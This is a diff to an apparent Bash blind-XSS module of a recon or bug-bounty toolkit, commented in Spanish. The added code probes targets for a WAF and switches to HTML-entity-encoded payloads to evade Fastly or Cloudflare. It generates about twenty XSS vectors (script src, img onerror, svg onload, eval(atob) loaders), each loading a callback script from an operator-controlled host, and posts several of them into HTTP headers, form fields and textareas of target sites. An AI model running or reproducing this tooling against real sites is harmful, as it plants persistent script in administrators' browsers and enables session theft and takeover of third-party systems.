@@ -25,11 +25,18 @@
 MODULE_NAME="blind_xss"
 MODULE_DESC="Blind XSS con payloads identificados"
 
-# ── Verificar EZXSS configurado ───────────────────────────────
+# ── Verificar configuración de servidor BXSS ─────────────────
+# Soporta servidor standalone (BXSS_SERVER_DOMAIN) o EZXSS legacy
 _blindxss_check_config() {
+  if [[ -n "${BXSS_SERVER_DOMAIN:-}" ]]; then
+    # Servidor standalone propio
+    EZXSS_DOMAIN="${BXSS_SERVER_DOMAIN}"
+    return 0
+  fi
   if [[ -z "${EZXSS_DOMAIN:-}" ]] || [[ -z "${EZXSS_URL:-}" ]]; then
-    log_warn "EZXSS no configurado — configura EZXSS_DOMAIN y EZXSS_URL en .env"
-    log_info "Instala EZXSS con: sudo bash blindxss/setup_ezxss.sh"
+    log_warn "Blind XSS no configurado — configura BXSS_SERVER_DOMAIN o EZXSS_DOMAIN en config.env"
+    log_info "Servidor standalone: bash blindxss/start_listener.sh"
+    log_info "EZXSS legacy: sudo bash blindxss/setup_ezxss.sh"
     return 1
   fi
   return 0
@@ -43,19 +50,106 @@ _gen_payload_id() {
     md5sum | cut -c1-8
 }
 
+# ── Detectar WAF y elegir codificación óptima ─────────────────
+# Envía un canary con <script> raw; si el WAF devuelve 4xx, cambia
+# a HTML entity encoding (&#x3C; &#x3E;) que bypasea Fastly/Cloudflare.
+# Cachea el resultado por subdominio para no repetir la sonda.
+declare -gA _WAF_ENCODE_CACHE
+
+_waf_needs_encoding() {
+  local URL="$1" PROXY_FLAG="$2"
+  local HOST
+  HOST=$(echo "$URL" | sed 's|https\?://||;s|/.*||')
+
+  if [[ -v _WAF_ENCODE_CACHE["$HOST"] ]]; then
+    [[ "${_WAF_ENCODE_CACHE[$HOST]}" == "1" ]]
+    return $?
+  fi
+
+  local STATUS
+  STATUS=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" \
+    -X POST "$URL" \
+    -H "Content-Type: application/json" \
+    -d '{"q":"<script>alert(1)</script>"}' \
+    ${PROXY_FLAG} 2>/dev/null)
+
+  if [[ "$STATUS" == "406" || "$STATUS" == "403" ]]; then
+    _WAF_ENCODE_CACHE["$HOST"]="1"
+    log_info "  WAF detectado en $HOST (HTTP $STATUS) — activando entity encoding"
+    return 0
+  else
+    _WAF_ENCODE_CACHE["$HOST"]="0"
+    return 1
+  fi
+}
+
 # ── Generar variantes del payload ─────────────────────────────
-# Distintas formas de inyectar según el campo
+# Emite ~20 variantes ordenadas de más a menos probable.
+# Cubre contextos: HTML directo, valor de atributo (break-out),
+# event handlers, JS string, href/action, y bypass de WAF.
+#
+# Diseño: mismo payload_id en todas → cualquier variante que dispare
+# manda el mismo callback. El caller elige cuántas probar.
 _gen_payloads() {
   local PAYLOAD_ID="$1"
-  local EZXSS_DOMAIN="${EZXSS_DOMAIN}"
+  local URL="${2:-}"
+  local PROXY_FLAG="${3:-}"
+  local D="${BXSS_SERVER_DOMAIN:-${EZXSS_DOMAIN}}"
 
+  local CB="https://${D}/${PAYLOAD_ID}.js"
+  local CB_REL="//${D}/${PAYLOAD_ID}.js"
+
+  # Loader compacto para event handlers (comillas simples — safe en attr doble)
+  local JSL="var s=document.createElement('script');s.src='${CB}';document.head.appendChild(s)"
+  # Versión con backtick para contextos donde tanto ' como " están escapados
+  local JSL_BT="var s=document.createElement(\`script\`);s.src=\`${CB}\`;document.head.appendChild(s)"
+  # Versión eval(atob) para contextos de JS string
+  local CB_B64
+  CB_B64=$(printf '%s' "${JSL}" | base64 -w0 2>/dev/null || printf '%s' "${JSL}" | base64)
+  local JSL_EVAL="eval(atob('${CB_B64}'))"
+
+  # ── WAF detectado: variantes entity-encoded ────────────────
+  if [[ -n "$URL" ]] && _waf_needs_encoding "$URL" "$PROXY_FLAG"; then
+    # Codificar los chars < > " = que los WAF de nivel básico buscan
+    local ENC_CB
+    ENC_CB=$(printf '%s' "$CB" | sed 's|:|&#x3A;|g;s|/|&#x2F;|g')
+    cat << PAYLOADS
+&#x3C;script src=&#x22;${CB}&#x22;&#x3E;&#x3C;&#x2F;script&#x3E;
+&#x22;&#x3E;&#x3C;script src=&#x22;${CB}&#x22;&#x3E;&#x3C;&#x2F;script&#x3E;
+&#x3C;img src&#x3D;x onerror&#x3D;&#x22;${JSL}&#x22;&#x3E;
+&#x3C;svg onload&#x3D;&#x22;${JSL}&#x22;&#x3E;
+&#x3C;details open ontoggle&#x3D;&#x22;${JSL}&#x22;&#x3E;
+<script src="${CB}"></script>
+PAYLOADS
+    return
+  fi
+
+  # ── Sin WAF / WAF no detectado: variantes completas ───────
   cat << PAYLOADS
-<script src="https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js"></script>
-"><script src="https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js"></script>
-'><script src="https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js"></script>
-javascript:eval('var a=document.createElement(\"script\");a.src=\"https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js\";document.body.appendChild(a)')
-<img src=x onerror="var s=document.createElement('script');s.src='https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js';document.head.appendChild(s)">
-<svg onload="var s=document.createElement('script');s.src='https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js';document.head.appendChild(s)">
+<script src="${CB}"></script>
+"><script src="${CB}"></script>
+'><script src="${CB}"></script>
+<script/src="${CB}"></script>
+<ScRiPt SrC="${CB}"></ScRiPt>
+<script	src="${CB}"></script>
+<script src=${CB_REL}></script>
+"><script src=${CB_REL}></script>
+<img src=x onerror="${JSL}">
+"><img src=x onerror="${JSL}">
+'><img src=x onerror='${JSL}'>
+<svg onload="${JSL}">
+"><svg onload="${JSL}">
+<details open ontoggle="${JSL}">
+<input autofocus onfocus="${JSL}">
+<body onload="${JSL}">
+<video><source onerror="${JSL}">
+<iframe onload="${JSL}" style=display:none>
+--><script src="${CB}"></script>
+]]><script src="${CB}"></script>
+javascript:${JSL_EVAL}
+';${JSL_EVAL}//
+";${JSL_EVAL}//
+\`);${JSL_EVAL}//
 PAYLOADS
 }
 
@@ -73,9 +167,14 @@ _register_payload() {
 }
 
 # ── Inyectar en headers HTTP ──────────────────────────────────
+# Por cada header, enviamos 3 variantes en paralelo:
+#   1. Raw <script src> — el más efectivo si el admin panel renderiza el header
+#   2. Break-out + script — si el valor se pone dentro de un atributo HTML
+#   3. SVG onload — si hay DOMPurify que filtra <script> pero no SVG
 _inject_headers() {
   local URL="$1" DOMAIN_ID="$2" DOMAIN="$3" SUBDOMAIN="$4"
   local PROXY_FLAG="$5"
+  local D="${BXSS_SERVER_DOMAIN:-${EZXSS_DOMAIN}}"
 
   local HEADERS_TO_TEST=(
     "User-Agent"
@@ -86,31 +185,45 @@ _inject_headers() {
     "X-Custom-Header"
     "CF-Connecting-IP"
     "True-Client-IP"
+    "X-Real-IP"
     "Contact"
     "From"
+    "X-Filename"
+    "Accept-Language"
   )
 
   for HEADER in "${HEADERS_TO_TEST[@]}"; do
-    local PAYLOAD_ID
-    PAYLOAD_ID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "header_${HEADER}")
+    local PID
+    PID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "header_${HEADER}")
+    local CB="https://${D}/${PID}.js"
+    local JSL="var s=document.createElement('script');s.src='${CB}';document.head.appendChild(s)"
 
-    # Usar el payload más básico para headers
-    local PAYLOAD="<script src=\"https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js\"></script>"
+    # Las 3 variantes se envían como requests separados al mismo endpoint.
+    # Mismo PID → cualquiera que dispare manda el mismo callback.
+    local VARIANTS=(
+      "<script src=\"${CB}\"></script>"
+      "\"><script src=\"${CB}\"></script>"
+      "<svg onload=\"${JSL}\">"
+    )
 
-    # Inyectar el header en una petición GET a la URL
-    local STATUS
-    STATUS=$(curl -sL --max-time 10 \
-      -o /dev/null -w "%{http_code}" \
-      -H "${HEADER}: ${PAYLOAD}" \
-      ${PROXY_FLAG} \
-      "$URL" 2>/dev/null)
+    local REGISTERED=false
+    for VARIANT in "${VARIANTS[@]}"; do
+      local STATUS
+      STATUS=$(curl -sL --max-time 10 \
+        -o /dev/null -w "%{http_code}" \
+        -H "${HEADER}: ${VARIANT}" \
+        ${PROXY_FLAG} \
+        "$URL" 2>/dev/null)
 
-    if [[ "$STATUS" =~ ^[2345] ]]; then
-      _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
-        "$URL" "header" "$HEADER"
-      log_info "  ↪ Payload inyectado en header $HEADER ($PAYLOAD_ID)"
-    fi
-
+      if [[ "$STATUS" =~ ^[2345] ]]; then
+        if ! $REGISTERED; then
+          _register_payload "$DOMAIN_ID" "$PID" "$SUBDOMAIN" \
+            "$URL" "header" "$HEADER"
+          log_info "  ↪ Header $HEADER — 3 variantes inyectadas ($PID)"
+          REGISTERED=true
+        fi
+      fi
+    done
   done
 }
 
@@ -147,34 +260,40 @@ _inject_forms() {
     done
     $IS_JUICY || continue
 
-    # Generar payload único para este campo
     local PAYLOAD_ID
     PAYLOAD_ID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "field_${FIELD_NAME}")
 
-    local PAYLOAD
-    PAYLOAD=$(echo -n '"><script src="https://'"${EZXSS_DOMAIN}/${PAYLOAD_ID}"'.js"></script>')
-
-    # Extraer action del form
     local FORM_ACTION
     FORM_ACTION=$(echo "$HTML" | grep -oiP "(?<=action=[\"'])[^\"']+" | head -1)
     [[ -z "$FORM_ACTION" ]] && FORM_ACTION="$URL"
     echo "$FORM_ACTION" | grep -qP '^https?' || \
       FORM_ACTION="$(echo "$URL" | grep -oP 'https?://[^/]+')"
 
-    # Enviar el formulario con el payload en el campo jugoso
-    local STATUS
-    STATUS=$(curl -sL --max-time 10 \
-      -o /dev/null -w "%{http_code}" \
-      -X POST "$FORM_ACTION" \
-      --data-urlencode "${FIELD_NAME}=${PAYLOAD}" \
-      -H "Content-Type: application/x-www-form-urlencoded" \
-      ${PROXY_FLAG} 2>/dev/null)
+    # Probar top 5 variantes del payload — mismo PID, distintos vectores.
+    # Para stored XSS blind, el servidor acepta todas; disparará la que
+    # el admin panel renderice sin sanitizar.
+    local N_VAR=0 REGISTERED=false
+    while IFS= read -r PAYLOAD && [[ $N_VAR -lt 5 ]]; do
+      [[ -z "$PAYLOAD" ]] && continue
+      ((N_VAR++))
 
-    if [[ "$STATUS" =~ ^[2345] ]]; then
-      _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
-        "$URL" "form_field" "$FIELD_NAME"
-      log_info "  ↪ Payload inyectado en campo '$FIELD_NAME' ($PAYLOAD_ID)"
-    fi
+      local STATUS
+      STATUS=$(curl -sL --max-time 10 \
+        -o /dev/null -w "%{http_code}" \
+        -X POST "$FORM_ACTION" \
+        --data-urlencode "${FIELD_NAME}=${PAYLOAD}" \
+        -H "Content-Type: application/x-www-form-urlencoded" \
+        ${PROXY_FLAG} 2>/dev/null)
+
+      if [[ "$STATUS" =~ ^[2345] ]]; then
+        if ! $REGISTERED; then
+          _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
+            "$URL" "form_field" "$FIELD_NAME"
+          log_info "  ↪ Campo '$FIELD_NAME' — ${N_VAR} variantes inyectadas ($PAYLOAD_ID)"
+          REGISTERED=true
+        fi
+      fi
+    done < <(_gen_payloads "$PAYLOAD_ID" "$URL" "$PROXY_FLAG")
 
   done < <(echo "$HTML" | grep -ioP '<input[^>]+>' | head -20)
 
@@ -194,26 +313,33 @@ _inject_forms() {
     local PAYLOAD_ID
     PAYLOAD_ID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "textarea_${TA_NAME}")
 
-    local PAYLOAD="<script src=\"https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js\"></script>"
-
     local FORM_ACTION
     FORM_ACTION=$(echo "$HTML" | grep -oiP "(?<=action=[\"'])[^\"']+" | head -1)
     [[ -z "$FORM_ACTION" ]] && FORM_ACTION="$URL"
     echo "$FORM_ACTION" | grep -qP '^https?' || \
       FORM_ACTION="$(echo "$URL" | grep -oP 'https?://[^/]+')"
 
-    local STATUS
-    STATUS=$(curl -sL --max-time 10 \
-      -o /dev/null -w "%{http_code}" \
-      -X POST "$FORM_ACTION" \
-      --data-urlencode "${TA_NAME}=${PAYLOAD}" \
-      ${PROXY_FLAG} 2>/dev/null)
+    local N_VAR=0 REGISTERED=false
+    while IFS= read -r PAYLOAD && [[ $N_VAR -lt 5 ]]; do
+      [[ -z "$PAYLOAD" ]] && continue
+      ((N_VAR++))
 
-    if [[ "$STATUS" =~ ^[2345] ]]; then
-      _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
-        "$URL" "textarea" "$TA_NAME"
-      log_info "  ↪ Payload inyectado en textarea '$TA_NAME' ($PAYLOAD_ID)"
-    fi
+      local STATUS
+      STATUS=$(curl -sL --max-time 10 \
+        -o /dev/null -w "%{http_code}" \
+        -X POST "$FORM_ACTION" \
+        --data-urlencode "${TA_NAME}=${PAYLOAD}" \
+        ${PROXY_FLAG} 2>/dev/null)
+
+      if [[ "$STATUS" =~ ^[2345] ]]; then
+        if ! $REGISTERED; then
+          _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
+            "$URL" "textarea" "$TA_NAME"
+          log_info "  ↪ Textarea '$TA_NAME' — ${N_VAR} variantes inyectadas ($PAYLOAD_ID)"
+          REGISTERED=true
+        fi
+      fi
+    done < <(_gen_payloads "$PAYLOAD_ID" "$URL" "$PROXY_FLAG")
 
   done < <(echo "$HTML" | grep -ioP '<textarea[^>]+>' | head -10)
 }
@@ -404,12 +530,19 @@ module_run() {
     "SELECT COUNT(*) FROM blindxss_payloads
      WHERE domain_id=${DOMAIN_ID} AND fired=0;" 2>/dev/null || echo 0)
 
+  local LISTENER_INFO
+  if [[ -n "${BXSS_SERVER_DOMAIN:-}" ]]; then
+    LISTENER_INFO="Servidor propio activo"
+  else
+    LISTENER_INFO="Monitor: blindxss_callback.py --poll"
+  fi
+
   _telegram_send "🎯 *Blind XSS — Payloads inyectados*
 🌐 \`${DOMAIN}\`
 💉 Payloads activos: \`${PAYLOAD_COUNT}\`
 🔍 Servidor: \`https://${EZXSS_DOMAIN}\`
 ⏳ Esperando callbacks...
-💡 Monitoriza con: python3 core/blindxss_callback.py --poll
+💡 ${LISTENER_INFO}
 📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
 
   log_ok "$MODULE_DESC completado: $PAYLOAD_COUNT payloads activos esperando callback"
